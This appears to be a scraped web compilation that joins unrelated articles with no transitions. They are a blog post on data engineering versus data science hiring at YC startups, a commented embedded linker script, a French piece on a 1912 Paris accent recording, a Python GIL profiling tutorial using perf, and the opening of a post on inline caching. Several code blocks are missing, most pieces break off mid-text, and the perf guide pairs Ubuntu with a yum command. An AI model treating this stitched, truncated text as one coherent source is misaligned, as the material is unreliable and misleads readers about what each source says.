<p><strong>TLDR</strong>: There are <strong>70% more open roles</strong> at companies in <em>data engineering</em> as compared to <em>data science</em>. As we train the next generation of data and machine learning practitioners, let’s place more emphasis on engineering skills.</p>
<hr>
<p>As part of my work developing an <a href="https://www.confetti.ai/">educational platform</a> for data professionals, I think a lot about how the market for data-driven (machine learning and data science) roles is evolving. </p>
<p>In talking to dozens of prospective entrants to data fields including students at top institutions around the world, I’ve seen a tremendous amount of confusion around what skills are most important to help candidates stand out in the crowd and prepare for their careers. </p>
<p>When you think about it, a <em>data scientist</em> can be responsible for any subset of the following: machine learning modelling, visualization, data cleaning and processing (i.e. SQL wrangling), engineering, and production deployment. </p>
<p>How do you even begin to recommend a study curriculum for newcomers?</p>
<p>Data speaks louder than words. So I decided to do an analysis of the data roles being hired for at every company coming out of <a href="https://www.ycombinator.com/">Y-Combinator</a> since 2012. The questions that guided my research:</p>
<ul>
<li>What data roles are companies most frequently hiring for?</li>
<li>How in-demand is the conventional <em>data scientist</em> that we talk about so much?</li>
<li>Are the same skills that started the data revolution relevant today?</li>
</ul>
<p>If you want the full details and analysis, read on. </p>
<h2>Methodology</h2>
<p>I chose to do an analysis of YC portfolio companies that claim to make some sort of data work part of their value proposition. </p>
<p>Why focus on YC? Well, for starters, they do a good job of providing an easily searchable (and scrapable) <a href="https://www.ycombinator.com/companies/">directory of their companies</a>. </p>
<p>In addition, as a particularly forward-thinking incubator that has funded companies from around the world across domains for over a decade, I felt they provided a representative sample of the market with which to conduct my analyses. That being said, take what I say wit a grain of salt, as I didn’t analyze super-large tech companies.</p>
<p>I scraped the homepage URLs of every YC company since 2012, producing an initial pool of ~1400 companies. </p>
<p>Why stop at 2012? Well, 2012 was the year that <a href="https://en.wikipedia.org/wiki/AlexNet">AlexNet</a> won the ImageNet competition, effectively kickstarting the machine learning and data-modelling wave we are now living through. It’s fair to say that this birthed some of the earliest generations of data-first companies.</p>
<p>From this initial pool, I performed keyword filtering to reduce the number of relevant companies I would have to look through. In particular, I only considered companies whose websites included at least one of the following terms: AI, CV, NLP, natural language processing, computer vision, artificial intelligence, machine, ML, data. I also disregarded companies whose website links were broken. </p>
<p>Did this generate a ton of false positives? Absolutely! But here I was trying to prioritize high recall as much as possible, recognizing that I would do a more fine-grained manual inspection of the individual websites for relevant roles.</p>
<p>With this reduced pool, I went through every site, found where they were advertising jobs (typically a <em>Careers</em>, <em>Jobs</em>, or <em>We’re Hiring</em> page), and took note of every role that included data, machine learning, NLP, or CV in the title. This gave me a pool of about 70 distinct companies hiring for data roles. </p>
<p>One note here: it’s conceivable that I missed some companies as there were certain websites with very little information (typically those in stealth) that might actually be hiring. In addition, there were companies that didn’t have a formal <em>Careers</em> page but asked that prospective candidates reach out directly via email. </p>
<p>I disregarded both of these types of companies rather than reach out to them, so they are not part of this analysis.</p>
<p>Another thing: the bulk of this research was done towards the final weeks of 2020. Open roles may have changed as companies update their pages periodically. However, I don’t believe this will drastically impact the conclusions drawn. </p>
<h2>What Are Data Practitioners Responsible For?</h2>
<p>Before diving into the results, it’s worth spending some time clarifying what responsibilities each data role is typically responsible for. Here are the four roles we will spend our time looking at with a short description of what they do:</p>
<ul>
<li><em>Data scientist</em>: Use various techniques in statistics and machine learning to process and analyse data. Often responsible for building models to probe what can be learned from some data source, though often at a prototype rather than production level. </li>
<li><em>Data engineer</em>: Develops a robust and scalable set of data processing tools/platforms. Must be comfortable with SQL/NoSQL database wrangling and building/maintaining ETL pipelines.</li>
<li><em>Machine Learning (ML) Engineer</em>: Often responsible for both training models and productionizing them. Requires familiarity with some high-level ML framework and also must be comfortable building scalable training, inference, and deployment pipelines for models.</li>
<li><em>Machine Learning (ML) Scientist</em>: Works on cutting-edge research. Typically responsible for exploring new ideas that can be published at academic conferences. Often only needs to prototype new state-of-the-art models before handing off to ML engineers for productionization.</li>
</ul>
<h2>How Many Data Roles Are There?</h2>
<p>So what happens when we plot the frequency of each data role that companies are hiring for? The plot looks  like this:</p>
<figure>

</figure>
<p>What immediately stands out is how many more open <em>data engineer</em> roles there are compared to traditional <em>data scientists</em>. In this case, the raw counts correspond to companies hiring <strong>roughly 55% more</strong> for data engineers than data scientists, and roughly the same number of machine learning engineers as data scientists.</p>
<p>But we can do more. If you look at the titles of the various roles, there seems to be some repetition. </p>
<p>Let’s only provide coarse-grained categorization through role consolidation. In other words, I took roles whose descriptions were roughly equivalent and consolidated them under a single title. </p>
<p>That included the following set of equivalence relations: </p>
<ul>
<li><em>NLP engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>CV engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>ML engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Deep Learning engineer</em> (while the domains might be different, the responsiblities are roughly the same)</li>

<p>I probably could have lumped <em>ML research engineer</em> into one of the <em>ML scientist</em> or <em>ML engineer</em> bins, but given that it was a bit of a hybrid role, I left it as is. </p>
<p>Overall the consolidation made the differences even more pronounced! There are <strong>~70%</strong> more open <em>data engineer</em> than <em>data scientist</em> positions. In addition, there are <strong>~40%</strong> more open <em>ML engineer</em> than <em>data scientist</em> positions. There are also only <strong>~30%</strong> as many <em>ML scientist</em> as <em>data scientist</em> positions. </p>
<h2>Takeaways</h2>
<p><em>Data engineers</em> are in increasingly high demand compared to other data-driven professions. In a sense, this represents an evolution for the broader field. </p>
<p>When machine learning become hot 🔥 5-8 years ago, companies decided they need people that can make classifiers on data. But then frameworks like <a href="https://www.tensorflow.org/">Tensorflow</a> and <a href="https://pytorch.org/">PyTorch</a> became really good, democratizing the ability to get started with deep learning and machine learning. </p>
<p>This commoditized the data modelling skillset. </p>
<p>Today, the bottleneck in helping companies get machine learning and modelling insights to production center on data problems. </p>
<p>How do you annotate data? How do you process and clean data? How do you move it from A to B? How do you do this every day as quickly as possible?</p>

<p>All that amounts to having good engineering skills. </p>
<p>This may sound boring and unsexy, but old-school software engineering with a bend toward data may be what we really need right now. </p>
<p>For years, we’ve become enamored with the idea of data professionals that breathe life into raw data thanks to cool demos and media hype. After all, when was the last time you saw a <a href="https://techcrunch.com/">TechCrunch</a> article about an ETL pipeline? </p>
<p>If nothing else, I believe solid engineering is something we don’t emphasize enough in data science job training or educational programs. In addition to learning how to use <em>linear_regression.fit()</em>, learn how to write a unit test too!</p>
<p>So does that mean you shouldn’t study data science? No. </p>
<p>What it means is that competition is going to be tougher. There are going to be fewer positions available for what is looking to be an abundance of newcomers to the market trained to do data science. </p>
<p>There will always be a need for people that can effectively analyze and extract actionable insights from data. But they have to be good. </p>
<p>Downloading a pretrained model off the Tensorflow website on the <a href="https://scikit-learn.org/stable/auto_examples/datasets/plot_iris_dataset.html">Iris dataset</a> probably is no longer enough to get that data science job. </p>
<p>It’s clear, however, with the large number of <em>ML engineer</em> openings that companies often want a hybrid data practitioner: someone that can build and deploy models. Or said more succinctly, someone that can use Tensorflow but can also build it from source.</p>
<p>Another takeaway here is that there just aren’t that many ML research positions. </p>
<p>Machine learning research tends to get its fair share of hype because that’s where all the cutting-edge stuff happens, all the <a href="https://deepmind.com/research/case-studies/alphago-the-story-so-far">AlphaGo</a> and <a href="https://openai.com/blog/openai-api/">GPT-3</a> and what-not. </p>

    <p>While developing the firmware for Winterbloom's <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux">Castor &amp; Pollux</a>, I got very curious as to just what the Microchip/Atmel-provided linker script was doing.</p>
<p>If you've never heard of or seen a linker script before you're not alone. Most of us never even have to think about them, however, on memory constained embedded devices it's not uncommon to need to modify the default linker script.</p>
<p>The linker script controls how <code>ld</code> combines all of your <code>.o</code> files into a single <code>.elf</code> and how that resulting <code>.elf</code> file gets loaded by the target processor.</p>
<p>So I was staring at this script that made absolutely no sense to me. It's filled with incantations and mysterious symbols and there's no indication of what they're for or where they come from.</p>
<p>So I did a <strong>lot</strong> of research and now I can present to you <strong>the most thoroughly commented linker script</strong><sup id="fnref:probably"><a href="#fn:probably">1</a></sup>.</p>
<p>You can see this script in its entirety, comments and all, on <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/blob/master/firmware/scripts/samd21g18a.ld">GitHub</a>. But if you'd like to read it here instead it's transcribed below.</p>
<h2 id="output-format">Output format</h2>
<p>Output format sets the ELF output format to use a specific BFD backend.</p>
<p>The first is the default BFD. The second and third arguments are used
when big (-EB) or little (-EL) endian is requested.</p>
<p>Since the SAM D series are configured with only little endian support,
"elf32-littlearm" is used across the board. This option seems to be
included by Atmel/Microchip out of an abundance of caution, as
arm-none-eabi-ld will do the right thing and use "elf32-littlearm" by
default.</p>
<p>The list of acceptable values can be obtained using <code>objdump -i</code>.</p>

<p>These variables are used by the following "MEMORY" command to define
the various memory spaces.</p>
<p>For the SAMD21G18A used by this project, the available Flash is
262kB and the available SRAM is 32kB.</p>
<p>This project also reserves 8kB for the bootloader and 1kB for
"non-volatile memory" (NVM) - which is used by the application
to store calibration and user settings.</p>

<p>ARM Cortex-M processors use a descending stack and generally
require stack space to be set aside in RAM.</p>
<p>The application's behavior determines just how much stack space
should be reserved. I generally start with 2kB (0x800) of
stack space for Cortex-M0+ projects programmed in C .</p>
<p>You can analyze stack usage in GCC using the <code>-fstack-usage</code>
flag and you can enable compiler warnings for stack usage
with <code>-Wstack-usage=STACK_SIZE</code>.</p>

<h2 id="memory-space-definition">Memory space definition</h2>
<p>This section declare blocks of memories for specific purposes. Since an
ARM's address space is generally split between Flash, SRAM, peripherals,
and other regions, it's necessary to tell the linker where different
types of data can go in the address space.</p>
<p>These blocks will be used in the <code>SECTIONS</code> command below.</p>

</pre>
<p>Start with the Flash memory region. On the SAMD21, Flash starts at
the beginning of the address space (<code>0x00000000</code>) and is contiguous
right up to the size of the Flash. Flash is marked a <code>rx</code> so
that the linker knows that this space is read-only (<code>r</code>) and
executable (<code>x</code>).</p>
<p>The "bootloader" section allows this firmware to work with the uf2
bootloader. The bootloader takes the first 0x2000 bytes of flash
memory.</p>

</pre>
<p>Following the bootloader is the flash memory used by the application,
called "rom" here - even though it's flash, the name is just a name
and doesn't carry special meaning.</p>
<p>The total length of the rom block is the MCU's flash size minus the
bootloader's size and any space reserved for "non-volatile memory"
by the application.</p>

</pre>
<p>The "nvm" block is space set aside for the application to store
user settings and calibration data in the MCU's flash.</p>
<p>The block is located right at the end of the flash space. This
is useful because it means that it says in a fixed location
regardless of how much flash space the application takes up
in "rom". Explicitly defining this section also lets the
linker ensure that application code doesn't overwrite the
data in this region.</p>
<p>This block is marked as read-only (<code>r</code>) because flash can not
be written in the same way as normal memory, however, the
application can use the SAMD's NVM peripheral to write data in
this region.</p>

<p>The "ram" block is mapped to the CPU's SRAM and it's where
the stack, heap, and all variables will go.</p>

for the size of the SRAM.</p>

<h2 id="sections">Sections</h2>
<p>The sections command tells the linker how to combine the
input files into an output ELF and where segments belong
in memory.</p>
<p>The linker takes a set of input files containing the "input
sections" and uses this to map them to "output sections"
which are placed in the output ELF file.</p>
<p>While the most important sections to think about here
are the ones that'll be placed into the memory (segments)
some sections are just placed in the output ELF for debugging.</p>

<p>The vector table defines the initial stack pointer and
interrupt/exception routines for the ARM CPU and device
peripherals. Every Cortex-M project needs this.</p>
<p>For the SAM D series the vector table is expected
to be at address 0x00000000 after reset. Since
flash memory starts at 0x00000000, the first values
in flash should be the vector table.</p>
<p>When defining the vector table in code you must use
<code>__attribute__ ((section(".vectors")))</code> to tell
GCC to place the vector table into the section
named ".vectors" in the input object file so that
the linker can find it.</p>
<p>Note that since this project uses the UF2 bootloader,
this actually gets placed at the beginning of the
program's flash area (0x2000). The Cortex-M allows
changing the vector table after initialization,
so the startup script sets the Vector Table Offset
Register (<code>SCB-&gt;VTOR</code>) to <code>_sfixed</code> during its
intialization. The <code>_efixed</code> symbol is unused but
included for completeness.</p>

<p>Include code and read-only data sections from all
input files.</p>
<p>By default, GCC places all program code into a section named
".text" and read-only data (such as const static variables) into
a section named ".rodata" in the input object files. This naming
convention is from the ELF ABI specification.</p>
<p>GCC generates three "flavors" of sections in object files:</p>
<ul>
<li><code>.{section}</code>: the basic section.</li>
<li><code>.{section}.*</code>: sections generated by <code>-ffunction-sections</code> and
<code>-fdata-sections</code> so that each function/data has a unique
section.</li>
<li><code>.gnu.linkonce.{type}.*</code>: sections generated by GCC so the
linker can remove duplicates. Seems to be related to
Vague Linking.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>"C’est extraordinaire que j’aie une voix aussi traînarde, jamais je l’aurais cru ! On ne s’entend pas, absolument !" Dans ce document unique en son genre, un Parisien réagit à l'écoute de son propre accent, celui du 14e arrondissement, en 1912. Il est interviewé par le linguiste Ferdinand Brunot. </p><div>
            <p>Cette archive exceptionnelle est l’une des premières interviews sonores, le premier enregistrement d'un échange spontané, non lu. C’est aussi l’une des rares traces de l’accent parisien d’avant-guerre. En 1912, le linguiste Ferdinand Brunot veut enregistrer les dialectes des artisans. Ici, c’est le parler parisien qui l’intéresse, l’accent populaire des différents quartiers de la capitale. Louis Ligabue, tapissier dans le 14e arrondissement, a alors 37 ans, et note déjà l'embourgeoisement de son quartier.</p>

<h2>Le parler d'un pur "Parisien de Paris"</h2>
<p>Le linguiste Ferdinand Brunot, fondateur des "Archives de la parole"&nbsp;en 1911, est l'un des rares universitaires de son temps à s'intéresser à l'enregistrement du français parlé&nbsp;"commun". Pour lui, le "parler parisien" est une forme de dialecte dont il faut garder la trace. Chaque quartier de la capitale est censé présenter ses spécificités linguistiques&nbsp;: on ne parle pas à Montrouge comme à Montmartre. Or pour <a target="_blank" rel="noopener" href="https://gallica.bnf.fr/blog/11052020/quand-un-parisien-entend-pour-la-premiere-fois-le-son-de-sa-voix?mode=desktop">Pascal Cordereix</a>, responsable du service des documents sonores à la BnF, "<em>ce 'dialecte' parisien renvoie lui-même à l’un des plus grands mythes de la linguistique romane parisienne de la fin du XIXe siècle, à savoir le "françien", un supposé dialecte d’Île-de-France dans lequel le français trouverait sa seule origine. On est là au cœur de la construction jacobine de la langue française mise en œuvre après 1870, opposant définitivement français et autres idiomes parlés sur le territoire.</em>"</p>
<p><em>Ferdinand Brunot interviewe Louis Ligabue en 1912&nbsp;:&nbsp;</em></p>


<p>- Vous êtes vraiment, vous monsieur, un Parisien de Paris&nbsp;?&nbsp;</p>
<p><em>-</em> Je suis né à Paris même, boulevard Sébastopol et j’ai monté du côté de Montrouge, rue Daguerre. Ensuite, j’ai été avenue d’Orléans. J’ai travaillé dans le quartier constamment. Je ne l’ai jamais quitté du reste.&nbsp;</p>
<p>- Et vous êtes exclusivement tapissier, alors&nbsp;?&nbsp;</p>
<p>- Absolument. (...) et je travaille pour le client personnel (...)</p>
<p>- Vous êtes exclusivement dans la clientèle bourgeoise&nbsp;?&nbsp;</p>
<p>- Oui, monsieur.</p>
<p>- Il y a eu beaucoup d’installations de ce côté-là, ce doit être un bon métier&nbsp;?</p>
<p><em>-</em> Ah le quartier a beaucoup gagné. Nous avons depuis quelques années travaillé admirablement.</p>
<p>- J’ai entendu dire que vous n’étiez pas payé très régulièrement...</p>
<p>- Oh vous savez, le 14e est tout à fait spécial. Nous avons de bons clients, de bons bourgeois, et puis régulièrement, on hésite à donner une affaire... Mais quant au règlement, jamais nous ne perdons quoi que ce soit.&nbsp;</p>
<p>- On m’avait dit au contraire que rue Alphonse Daudet, il y avait une clientèle peu recommandable...</p>
<p>- Ah dame ! Ça, je m’en réjouis bien !</p>
<h2>Entendre sa propre voix</h2>
<p>Ce document est unique à plus d'un titre&nbsp;: c’est aussi la première fois qu’on entend quelqu’un réagir à ses propos, à sa voix. &nbsp;Dans la foulée de l’interview, Louis Ligabue s’écoute, et s’étonne, toujours en dialoguant avec le linguiste Ferdinand Brunot. <a target="_blank" rel="noopener" href="https://gallica.bnf.fr/blog/11052020/quand-un-parisien-entend-pour-la-premiere-fois-le-son-de-sa-voix?mode=desktop">Pascal Cordereix</a>, spécialiste du fonds sonore ancien à la Bibliothèque nationale de France (BnF)&nbsp;: "<em>On connaît beaucoup de récits écrits d’un enregistrement et de la surprise du locuteur s’écoutant parler. Mais à notre connaissance, Ferdinand Brunot est le seul, avant longtemps, à avoir l’idée de graver ainsi sur disque les réactions du témoin à l’écoute de sa propre voix.</em>"</p>
<p><strong>Ferdinand Brunot interviewe Louis Ligabue en 1912&nbsp;:&nbsp;</strong></p>
<p>- Eh bien, vous avez entendu ce que vous avez dit. Vous êtes-vous reconnu&nbsp;?&nbsp;</p>
<p>- Oui, parfaitement monsieur !</p>
<p>- N’est-ce pas que c’est bien votre voix&nbsp;?&nbsp;</p>
<p>- C’est parfait, parfait, c’est même très très curieux ! C’est très drôle, il me semble même que c’est extraordinaire que j’aie une voix si traînarde, jamais je ne l’aurais cru ! On ne s’entend pas, absolument !&nbsp;</p>
<p>- Vous n’avez pas la voix traînarde, vous avez tout simplement l’accent de Paris, c’est justement ça que je veux enregistrer.&nbsp;</p>
<p>- Ah ça aujourd'hui j’en suis convaincu, bien des gens m’ont dit des fois&nbsp;: “Comme il traîne ce garçon dans sa conversation”. Ben, je disais non, pourtant, il me semble que c’est tout naturel&nbsp;; mais alors là, vous savez, j’ai un accent presque d’La Villette on dirait…</p>
<p>- La Villette&nbsp;? Ne croyez-vous pas qu’il y a une grande différence justement entre l’accent de La Villette et le vôtre&nbsp;?</p>
<p>- Ah peut-être, je ne sais pas…</p>
<p>- Vous qui êtes de Paris, est-ce que vous ne reconnaissez pas justement quelqu’un qui est de nos arrondissements&nbsp;?</p>
<p>- Ah absolument, si, il y a réellement des différences.</p>
<p>- Quelqu’un qui s’est beaucoup occupé de ça me disait par exemple qu’il reconnaissait du premier coup un habitant du 14e et un habitant de Montmartre.</p>
<p>- Ah peut-être, mais enfin, il me semble que c’est une étude assez sérieuse.</p>
<p>- Oui, il y a des gars qui imitent ça étonnamment et à volonté vous savez, ils se transforment en gens de Montparnasse, ou en gens de Montmartre comme ils veulent.</p>
<p>- Ah oui, on voit ça dans les revues, là, dans les concerts, là&nbsp;; on a des types spéciaux là-dessus.</p>
<p>- Oui. Est-ce que dans la rue de la Gaîté, là, il y a des gens qui imitent justement l’accent du quartier&nbsp;?</p>
<p>- Ah y en a, y en a. Mais alors, ça devient peut-être un peu en exagération. Tandis que là, moi, je cause naturellement, et quand j’écoute, il me semble que j’exagère… Je suis bien content, vous savez, d’avoir jugé et ça m’a bien intéressé !</p>
<p>- Et bien je vous remercie de vous être prêté à l’expérience.</p>
<p>- De rien.</p>

<div>
<div>

<p>There are plenty of articles explaining why the Python GIL (The Global Interpreter Lock) exists<sup id="fnref-1"><a href="#fn-1">1</a></sup>, and why it is there. The TLDR version is: the GIL prevents multithreaded pure Python code from using multiple CPU cores.</p>
<p>However, in <a href="https://vaex.io/">Vaex</a> we execute most of the CPU intensive parts in C (C++) code, where we release the GIL. This is a common practice in high-performance Python libraries, where Python acts merely as a high-level glue.</p>
<p>However, the GIL needs to be released explicitly, and this is the responsibility of the programmer and might be forgotten, leading to suboptimal use of your machine.</p>
<p>I recently had this issue in <a href="https://github.com/vaexio/vaex/pull/1114">Vaex</a> where I simply forgot to release the GIL and found a similar issue in <a href="https://github.com/apache/arrow/pull/7756">Apache Arrow</a><sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>Also, when running on 64 cores, I sometimes see a performance in Vaex that I am not happy with. It might be using 4000% CPU, instead of 6400% CPU, which is something I am not happy with. Instead of blindly pulling some levers to inspect the effect, I want to understand what is happening, and if the GIL is the problem, why, and where is it holding Vaex down.</p>

<p>I'm planning to write a series of articles explaining some tools and techniques available for profiling/tracing Python together with native extensions, and how these tools can be glued together, to analyze and visualize what Python is doing, and when the GIL it taken or dropped.</p>
<p>I hope this leads to improvement of tracing, profiling, and other performance tooling in the Python ecosystem, and the performance of the whole Python ecosystem.</p>

<h2 id="Linux">

<p>Get access to a Linux machine, and make sure you have root privileges (sudo is fine), or ask your sysadmin to execute some of these commands for you. For the rest of the document, we only run as user.</p>
<h2 id="Perf">

<p>Make sure you have perf installed, e.g. on Ubuntu:</p>

<pre><code>$ sudo yum install perf</code></pre>
<h2 id="Kernel-configuration">

<p>To enable running it as a user:</p>

<pre><code># Enable users to run perf (use at own risk)
$ sudo sysctl kernel.perf_event_paranoid=-1

# Enable users to see schedule trace events:
$ sudo mount -o remount,mode=755 /sys/kernel/debug
$ sudo mount -o remount,mode=755 /sys/kernel/debug/tracing</code></pre>

<p>We will make use of <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> and <a href="https://github.com/maartenbreddels/per4m">per4m</a></p>

<pre><code>$ pip install "viztracer&gt;=0.11.2" "per4m&gt;=0.1,&lt;0.2"</code></pre>

<p>There is no way to get the GIL state in Python <sup id="fnref-3"><a href="#fn-3">1</a></sup> since there is no API for this. We can track it from the kernel, and the right tool for this under Linux is <strong>perf</strong>.</p>
<p>Using the linux perf tool (aka perf_events), we can listen to the state changes for processes/threads (we only care about sleeping and running), and log them. Although perf may look scary, it is a powerful tool. If you want to know a bit more about perf, I recommend reading <a href="https://jvns.ca/blog/2018/04/16/new-perf-zine/">Julia Evans' zine on perf</a> or <a href="http://www.brendangregg.com/perf.html">go through Brendan Gregg's website</a>.</p>
<p>To build our intuition, we will first run perf on a <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example0.py">very trivial program</a>:</p>


</div>
</div>
</div><div>
<div>
<div>
<p>We listen to just a few events to keep the noise down (note the use of wildcards):</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork \
        -e 'sched:sched_wak*' -- python -m per4m.example0
[ perf record: Woken up 2 times to write data ]
[ perf record: Captured and wrote 0,032 MB perf.data (33 samples) ]</code></pre>
<p>And use the <code>perf script</code> command to write human/parsable output.</p>

<pre><code>$ perf script

</div><div>
<div>
<div>
<p>Take a moment to digest the output. I can see a few things. Looking at the 4th column (time in seconds), we can see where the program slept (it skips 1 second). Here we see that we enter the sleeping state with a line like:</p>
<p><code>python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120</code></p>
<p>This means the kernel changed the state of the Python thread to <code>S</code> (=sleeping) state.</p>
<p>A full second later, we see it being woken up:</p>
<p><code>swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></p>
<p>Of course, you need to build some tooling around this, to really see what is happening. But one can imagine this output can be easily parsed and this is what <a href="https://github.com/maartenbreddels/per4m/">per4m</a> does. However, before we go there, I'd first like to visualize the flow of a slightly more advanced program using <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a>.</p>

</div>
</div>
</div><div>
<div>
<div>

<p><a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> is a Python tracer that can visualize what your program does in the browser. Let us run it on a slightly <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example1.py">more advanced example</a> to see what it looks like.</p>

</div>
</div>
</div><div>
<div>
<div>
<p>Running viztracer gives output like:</p>

<pre><code>$ viztracer -o example1.html --ignore_frozen -m per4m.example1
Loading finish                                        
Saving report to /home/maartenbreddels/github/maartenbreddels/per4m/example1.html ...
Dumping trace data to json, total entries: 94, estimated json file size: 11.0KiB
Generating HTML report
Report saved.</code></pre>
<p>And the HTML should render as:
<img src="https://www.maartenbreddels.com/images/copied_from_nb/per4m/example1.png" alt="image.png"></p>
<p>From this, it seems that <code>some_computation</code> seem to be executed in parallel (twice), while in fact, we know the GIL is preventing that. So what is really going on?</p>

</div>
</div>
</div><div>
<div>
<div>

<p>Let us run <code>perf</code> on this, similarly to what we did to example0.py. However, we add the argument <code>-k CLOCK_MONOTONIC</code> so that we use <a href="https://github.com/gaogaotiantian/viztracer/blob/3321ba4024afe5623f938a601d7f7db3b08f534d/src/viztracer/modules/snaptrace.c#L91">the same clock as VizTracer</a> and ask VizTracer to generate a JSON, instead of an HTML file:</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork -e 'sched:sched_wak*' \
   -k CLOCK_MONOTONIC  -- viztracer -o viztracer1.json --ignore_frozen -m per4m.example1</code></pre>
<p>Then …</p></div></div></div></div>

<![CDATA[Inline Caching]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25773724">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | https://bernsteinbear.com/blog/inline-caching/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/inline-caching/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Inline caching is a popular technique for runtime optimization. It was first
introduced in 1984 in Deutsch &amp; Schiffman’s paper <a href="http://web.cs.ucla.edu/~palsberg/course/cs232/papers/DeutschSchiffman-popl84.pdf">Efficient implementation
of the smalltalk-80 system [PDF]</a> but has had a long-lasting legacy in
today’s dynamic language implementations. Runtimes like the Hotspot JVM, V8,
and SpiderMonkey use it to improve the performance of code written for those
virtual machines.</p>

<p>In this blog post, I will attempt to distill the essence of inline caching
using a small and relatively useless bytecode interpreter built solely for this
blog post. The caching strategy in this demo is a technique similar to the
ideas from <a href="http://www.complang.tuwien.ac.at/kps09/pdfs/brunthaler.pdf">Inline Caching meets Quickening [PDF]</a> in that it
caches function pointers instead of making use of a JIT compiler.</p>

<h2 id="background">Background</h2>

<p>In many compiled programming languages like C and C++, types and attribute
locations are known at compile time. This makes code like the following fast:</p>

<div><div><pre><code><span>#include "foo.h"
</span>
<span>Foo</span> <span>do_add</span><span>(</span><span>Foo</span> <span>left</span><span>,</span> <span>Foo</span> <span>right</span><span>)</span> <span>{</span>
  <span>return</span> <span>left</span><span>.</span><span>add</span><span>(</span><span>right</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>The compiler knows precisely what type <code>left</code> and <code>right</code> are (it’s <code>Foo</code>) and
also where the method <code>add</code> is in the executable. If the implementation is in
the header file, it may even be inlined and <code>do_add</code> may be optimized to a
single instruction. Check out the assembly from <code>objdump</code>:</p>

</code></pre></div></div>

<p>All it does is save the parameters to the stack, call <code>Foo::add</code>, and then
restore the stack.</p>

<p>In more dynamic programming languages, it is often impossible to determine at
runtime startup what type any given variable binding has. We’ll use Python as an
example to illustrate how dynamism makes this tricky, but this constraint is
broadly applicable to Ruby, JavaScript, etc.</p>

<p>Consider the following Python snippet:</p>

<div><div><pre><code><span>def</span> <span>do_add</span><span>(</span><span>left</span><span>,</span> <span>right</span><span>):</span>
    <span>return</span> <span>left</span><span>.</span><span>add</span><span>(</span><span>right</span><span>)</span>
</code></pre></div></div>

<p>Due to Python’s various dynamic features, the compiler cannot in general know
what type <code>value</code> is and therefore what code to run when reading <code>left.add</code>.
This program will be compiled down to a couple Python bytecode instructions
that do a very generic <code>LOAD_METHOD</code>/<code>CALL_METHOD</code> operation:</p>

<div><div><pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; dis.dis("""
... def do_add(left, right):
...     return left.add(right)
... """)
[snip]
Disassembly of &lt;code object do_add at 0x7f0b40cf49d0, file "&lt;dis&gt;", line 2&gt;:
  3           0 LOAD_FAST                0 (left)
              2 LOAD_METHOD              0 (add)
              4 LOAD_FAST                1 (right)
              6 CALL_METHOD              1
              8 RETURN_VALUE

&gt;&gt;&gt; 
</code></pre></div></div>

<p>This <code>LOAD_METHOD</code> Python bytecode instruction is unlike the x86 <code>mov</code>
instruction in that <code>LOAD_METHOD</code> is not given an offset into <code>left</code>, but
instead is given the name <code>"add"</code>. It has to go and figure out how to read
<code>add</code> from <code>left</code>’s type — which could change from call to call.</p>

<p>In fact, even if the parameters were typed (which is a new feature in Python
3), the same code would be generated. Writing <code>left: Foo</code> means that <code>left</code> is a
<code>Foo</code> <em>or</em> a subclass.</p>

<p>This is not a simple process like “fetch the attribute at the given offset
specified by the type”. The runtime has to find out what kind of object <code>add</code>
is. Maybe it’s just a function, or maybe it’s a <code>property</code>, or maybe it’s some
custom descriptor protocol thing. There’s no way to just turn this into a
<code>mov</code>!</p>

<p>… or is there?</p>

<h2 id="runtime-type-information">Runtime type information</h2>

<p>Though dynamic runtimes do not know ahead of time what types variables have at
any given opcode, they do eventually find out <em>when the code is run</em>. The first
time someone calls <code>do_add</code>, <code>LOAD_METHOD</code> will go and look up the type of
<code>left</code>. It will use it to look up the attribute <code>add</code> and then throw the type
information away. But the second time someone calls <code>do_add</code>, the same thing
will happen. Why don’t runtimes store this information about the type and the
method and save the lookup work?</p>

<p>The thinking is “well, <code>left</code> could be any type of object — best not make any
assumptions about it.” While this is <em>technically</em> true, Deutsch &amp;
Schiffman find that “at a given point in code, the receiver is often the same
class as the receiver at the same point when the code was last executed”.</p>

<blockquote>
  <p><strong>Note:</strong> By <em>receiver</em>, they mean the thing from which the attribute is
being loaded. This is some Object-Oriented Programming terminology.</p>
</blockquote>

<p>This is huge. This means that, even in this sea of dynamic behavior, humans
actually are not all that creative and tend to write functions that see only a
handful of types at a given location.</p>

<p>The Smalltalk-80 paper describes a runtime that takes advantage of this by
adding “inline caches” to functions. These inline caches keep track of variable
types seen at each point in the code, so that the runtime can make optimization
decisions with that information.</p>

<p>Let’s take a look at how this could work in practice.</p>

<h2 id="a-small-example">A small example</h2>

<p>I put together a <a href="https://github.com/tekknolagi/icdemo">small stack machine</a> with only a few operations. There
are very minimal features to avoid distracting from the main focus: inline
caching. Extending this example would be an excellent exercise.</p>

<h3 id="objects-and-types">Objects and types</h3>

<p>The design of this runtime involves two types of objects (<code>int</code>s and <code>str</code>s).
